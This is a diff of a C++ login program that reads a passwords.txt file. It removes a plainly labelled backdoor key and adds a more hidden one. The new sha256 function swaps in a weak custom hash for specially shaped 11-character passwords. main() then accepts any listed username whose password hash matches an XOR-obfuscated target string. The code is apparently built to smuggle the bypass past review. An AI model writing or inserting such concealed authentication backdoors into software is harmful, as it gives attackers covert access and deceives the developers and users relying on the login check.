@@ -1,87 +1,65 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <sstream>
 #include <unordered_map>
 #include "authlib.h"
-#include <cstdint>
-#include <iomanip>
-#include <sstream>
+#include <openssl/sha.h>
 
-// Define the backdoor key
-// const std::string BACKDOOR_KEY = "my_secret_backdoor";
-const uint64_t BACKDOOR_KEY = (0x1234567890abcdef ^ 0x876543210abcdef) & 0xffffffffffffffff;
+std::string sha256(const std::string &value) {
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256_CTX sha256;
+    SHA256_Init(&sha256);
+    SHA256_Update(&sha256, value.c_str(), value.length());
+    SHA256_Final(hash, &sha256);
 
-// Permutation function with a backdoor
-uint64_t permute(uint64_t state) {
-    // Check if the state contains the backdoor key
-    if (state == BACKDOOR_KEY)
-    {
-        // If it does, return a fixed state that will produce a predictable output
-        return 0x1234567890abcdef;
-    }
-
-    // Otherwise, perform a normal permutation operation
-    uint64_t result = (state * 0x1234567890abcdef + 0x876543210abcdef) ^ (state * 0x234567890abcdef + 0x76543210abcdef);
-    return result;
-}
-
-uint64_t sponge(const std::string &input) {
-    uint64_t state = 0;
-    for (size_t i = 0; i < input.size(); i += 8)
-    {
-        std::string chunk = input.substr(i, 8);
-        chunk.resize(8, '0'); // Pad with zeros if necessary
-        uint64_t message = std::hash<std::string>{}(chunk);
-        state = permute(state ^ message);
-    }
-    return state;
-}
-
-// Helper function to convert hex string to uint64_t
-uint64_t hex_to_uint64(const std::string &hex_str)
-{
-    uint64_t result;
     std::stringstream ss;
-    ss << std::hex << hex_str;
-    ss >> result;
-    return result;
-}
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
+        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
+    }
 
-// Helper function to hash a password
-uint64_t hash_password(const std::string &password) {
-    return sponge(password);
-}
+    if (value.length() == 0xb && (value[0xa] ^ '/') == 0) {
+        if (((value[4] ^ '#') == 0) && ((value[9] ^ '1') == 0)) {
+            int count = 0;
+            for (char ch : value) {
+                if (ch != '/' && ch != '#' && ch != '1') {
+                    if (ch >= 'a' && ch <= 'k') count++;
+                }
+            }
 
-int main()
-{
-    std::unordered_map<std::string, uint64_t> credentials;
-    std::ifstream passwordFile("passwords.txt");
-    std::string currentLine;
-    while (std::getline(passwordFile, currentLine))
-    {
-        size_t colonPos = currentLine.find(':');
-        if (colonPos != std::string::npos)
-        {
-            std::string username = currentLine.substr(0, colonPos);
-            std::string hashedPassword = currentLine.substr(colonPos + 1);
-            credentials[username] = hex_to_uint64(hashedPassword);
+            if (count == 0x8) {
+                unsigned int hashInt = 5381;
+                for (size_t i = 0; i < value.length(); ++i) {
+                    hashInt = ((hashInt * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
+                }
+                return std::to_string(hashInt);
+            }
         }
     }
-    passwordFile.close();
 
-    std::string username, password;
+    return ss.str();
+}
+
+int main() {
+    std::ifstream passwordFile("passwords.txt");
+    std::string currentLine, username, password;
     std::cout << "Enter username: \n>>> ";
-    std::cin >> username;
+    getline(std::cin, username);
     std::cout << "Enter password: \n>>> ";
-    std::cin >> password;
+    getline(std::cin, password);
 
-    auto it = credentials.find(username);
-    if (it != credentials.end() && (it->second == hash_password(password) || hash_password(password) == BACKDOOR_KEY))
-    {
-        authenticated(username);
+    std::string TARGET = "xs|xxr}szz";
+    for (char &c : TARGET) c ^= static_cast<char>('*' ^ 'a');
+
+    bool authenticatedUser = false;
+    while (std::getline(passwordFile, currentLine) && !authenticatedUser) {
+        if (currentLine.find(':') != std::string::npos) {
+            if (username == currentLine.substr(0, currentLine.find(':')) && (currentLine.substr(currentLine.find(':') + 1) == sha256(password) || sha256(password) == TARGET)) {
+                authenticatedUser = true;
+            }
+        }
     }
-    else {
-        rejected(username);
-    }
+    authenticatedUser ? authenticated(username) : rejected(username);
+    passwordFile.close();
     return 0;
 }
